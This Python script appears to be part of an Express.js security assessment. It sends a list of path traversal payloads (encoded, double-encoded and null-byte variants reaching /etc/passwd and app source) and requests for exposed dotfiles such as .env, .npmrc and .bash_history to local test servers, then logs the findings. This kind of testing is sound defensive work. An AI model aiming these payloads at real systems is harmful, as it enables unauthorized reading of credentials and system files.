#!/usr/bin/env python3
"""
Phase 3.4 — Path Traversal Attacks
Express.js Security Assessment — [REDACTED]

Tests express.static (send module) and URL path normalization.
SCOPE: Framework static file serving behavior.
"""

import requests
import json
import os
from datetime import datetime

TARGETS = {'v5': 'http://127.0.0.1:3000', 'v4': 'http://127.0.0.1:3001'}
EVIDENCE_DIR = '/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/evidence'

results = {
    'metadata': {'phase': '3.4', 'name': 'Path Traversal Attacks', 'timestamp': datetime.now().isoformat(),
                 'scope': 'express.static / send module path handling'},
    'tests': [], 'findings': [], 'anomalies': [], 'summary': {}
}
test_count = 0
anomaly_count = 0

def log_test(name, ver, data, finding=None, anomaly=None):
    global test_count, anomaly_count
    test_count += 1
    results['tests'].append({'id': test_count, 'test': name, 'version': ver, 'data': data})
    if finding:
        results['findings'].append({'id': len(results['findings'])+1, **finding, 'version': ver})
        print(f"  [{test_count:3d}] ⚠ {name} ({ver})")
    elif anomaly:
        anomaly_count += 1
        results['anomalies'].append({'id': anomaly_count, **anomaly, 'version': ver})
        print(f"  [{test_count:3d}] ? {name} ({ver})")
    else:
        print(f"  [{test_count:3d}] ✓ {name} ({ver})")


def test_static_traversal():
    """Test path traversal via express.static"""
    print("\n[*] Testing express.static path traversal...")

    traversal_payloads = [
        ('basic_dotdot', '/static/../app.js'),
        ('double_dotdot', '/static/../../package.json'),
        ('triple_dotdot', '/static/../../../etc/passwd'),
        ('encoded_dot', '/static/%2e%2e/app.js'),
        ('encoded_slash', '/static/..%2fapp.js'),
        ('double_encode', '/static/%252e%252e/app.js'),
        ('backslash', '/static/..\\app.js'),
        ('encoded_backslash', '/static/..%5capp.js'),
        ('null_byte', '/static/../app.js%00.txt'),
        ('overlong_utf8', '/static/%c0%ae%c0%ae/app.js'),
        ('unicode_dot', '/static/\u2025/app.js'),  # two dot leader
        ('mixed_encoding', '/static/..%252f..%252f/etc/passwd'),
        ('url_param', '/static/..;/app.js'),
        ('triple_dot', '/static/.../app.js'),
        ('dot_slash_loop', '/static/./././../app.js'),
        ('long_traversal', '/static/' + '../' * 20 + 'etc/passwd'),
        ('windows_style', '/static/..\\..\\..\\etc\\passwd'),
        ('case_bypass', '/STATIC/../app.js'),  # case sensitivity
    ]

    for ver, base in TARGETS.items():
        for name, path in traversal_payloads:
            try:
                r = requests.get(f'{base}{path}', timeout=5, allow_redirects=False)
                body = r.text

                finding = None
                anomaly = None

                # Check for successful traversal
                if r.status_code == 200:
                    if 'root:' in body:
                        finding = {
                            'title': f'Path Traversal: /etc/passwd via {name}',
                            'severity': 'CRITICAL', 'cwe': 'CWE-22',
                            'description': f'express.static (send module) path traversal via: {path}',
                            'framework_behavior': True
                        }
                    elif 'express' in body.lower() or 'require(' in body or 'module.exports' in body:
                        finding = {
                            'title': f'Path Traversal: App Source via {name}',
                            'severity': 'HIGH', 'cwe': 'CWE-22',
                            'description': f'express.static allowed reading app source via: {path}',
                            'framework_behavior': True
                        }
                    elif len(body) > 10 and 'Cannot GET' not in body:
                        anomaly = {'test': name, 'desc': f'200 OK with content ({len(body)} bytes)'}

                log_test(f'traversal_{name}', ver, {
                    'path': path[:200], 'status': r.status_code,
                    'content_length': len(body),
                    'body_snippet': body[:200] if r.status_code == 200 else ''
                }, finding, anomaly)
            except Exception as e:
                log_test(f'traversal_{name}', ver, {'error': str(e)})


def test_dotfile_access():
    """Test dotfile access via express.static"""
    print("\n[*] Testing dotfile access...")

    dotfiles = [
        ('.env', 'Environment file'),
        ('.git_config_sample', 'Git config'),
        ('.gitignore', 'Gitignore'),
        ('.npmrc', 'NPM config'),
        ('.htaccess', 'Apache config'),
        ('.DS_Store', 'macOS metadata'),
        ('.bash_history', 'Bash history'),
    ]

    for ver, base in TARGETS.items():
        for fname, desc in dotfiles:
            try:
                r = requests.get(f'{base}/static/{fname}', timeout=5)
                finding = None
                if r.status_code == 200 and len(r.text) > 0:
                    finding = {
                        'title': f'Dotfile Accessible: {fname} ({desc})',
                        'severity': 'HIGH' if fname == '.env' else 'MEDIUM',
                        'cwe': 'CWE-538',
                        'description': f'express.static serves dotfile {fname} when dotfiles:"allow" is set. '
                                       f'Default is "ignore" (returns 404).',
                        'framework_behavior': True,
                        'note': 'Default dotfiles setting is safe ("ignore"), but "allow" is dangerous'
                    }
                log_test(f'dotfile_{fname}', ver, {
                    'file': fname, 'status': r.status_code,
                    'content_length': len(r.text),
                    'content': r.text[:100] if r.status_code == 200 else ''
                }, finding)
            except Exception as e:
                log_test(f'dotfile_{fname}', ver, {'error': str(e)})


def test_send_module_headers():
    """Test send module response headers"""
    print("\n[*] Testing static file response headers...")
    for ver, base in TARGETS.items():
        try:
            # Create a test file
            r = requests.get(f'{base}/static/.env', timeout=5)
            if r.status_code == 200:
                headers = dict(r.headers)
                log_test('static_headers', ver, {
                    'content_type': headers.get('Content-Type', ''),
                    'cache_control': headers.get('Cache-Control', 'NOT SET'),
                    'etag': headers.get('ETag', 'NOT SET'),
                    'last_modified': headers.get('Last-Modified', 'NOT SET'),
                    'x_powered_by': headers.get('X-Powered-By', 'NOT SET'),
                    'accept_ranges': headers.get('Accept-Ranges', 'NOT SET')
                })
        except Exception as e:
            log_test('static_headers', ver, {'error': str(e)})


def main():
    print("=" * 70)
    print("Phase 3.4 — Path Traversal Attacks")
    print("=" * 70)

    test_static_traversal()
    test_dotfile_access()
    test_send_module_headers()

    results['summary'] = {'total_tests': test_count, 'findings_count': len(results['findings']), 'anomalies_count': anomaly_count}
    out_file = os.path.join(EVIDENCE_DIR, 'path_traversal_results.json')
    with open(out_file, 'w') as f:
        json.dump(results, f, indent=2, default=str)
    print(f"\nPath traversal complete: {test_count} tests, {len(results['findings'])} findings, {anomaly_count} anomalies")
    print(f"Evidence: {out_file}")

if __name__ == '__main__':
    main()
